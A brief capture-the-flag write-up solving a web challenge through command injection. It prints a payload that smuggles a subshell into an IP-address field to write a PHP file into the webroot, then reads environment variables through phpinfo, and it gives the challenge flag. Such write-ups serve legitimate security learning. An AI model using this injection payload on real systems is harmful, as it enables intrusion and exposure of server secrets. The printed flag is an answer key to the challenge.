
Just because we humans are unable to observe something, doesn’t mean it isn't occurring.

I was greeted with the following

![[Pasted image 20240810174618.png]]

I thought of it maybe a susceptible to injection attack and tried it worked

then I utilised following command 

`127.0.0.1 $(echo '<?php echo phpinfo() ?>' > /var/www/html/test.php)`


This command does the following:

1. **`echo '<?php echo phpinfo() ?>'`**: Outputs the PHP code `<?php echo phpinfo() ?>`.
    
2. **`> /var/www/html/test.php`**: Redirects the output to a file named `test.php` in the `/var/www/html/` directory.

![[Pasted image 20240810174907.png]]

After doing so change the URL by appending `/test.php`
![[Pasted image 20240810174926.png]]

Scrolling down You can find flag in Environment variables.

![[Pasted image 20240810174959.png]]

The flag is `KPMG_CTF{8pQyCFIRyWSfj6SZSaOTNyWsIYn76_9gs5yJUOHlOMSJn33uiFyHNkoQOamP3NqFDZn9m8FiGQmBpUAuFlnqnE5gAGzkQSPTs9H_97u}`



